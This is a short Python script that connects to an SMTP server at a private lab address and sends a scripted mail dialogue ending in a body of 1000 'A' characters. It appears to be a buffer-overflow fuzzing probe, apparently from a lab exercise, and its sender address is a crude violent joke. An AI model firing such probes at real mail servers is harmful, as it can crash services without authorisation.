#!/usr/bin/python

import socket
s=socket.socket()
s.connect(("10.10.8.30",25))
print(s.recv(1024))
s.send("helo killem.net\n")
print(s.recv(1024))
s.send("mail from:dad@iwillkillyourwhole.family\n")
print(s.recv(1024))
s.send("rcpt to:postmaster@nukd.net\n")
print(s.recv(1024))
s.send("data\n")
print(s.recv(1024))
s.send("subject:hope nothing works guys\n")
s.send("A" *1000)
s.send("\n")
s.send(".\n")
s.recv(1024)
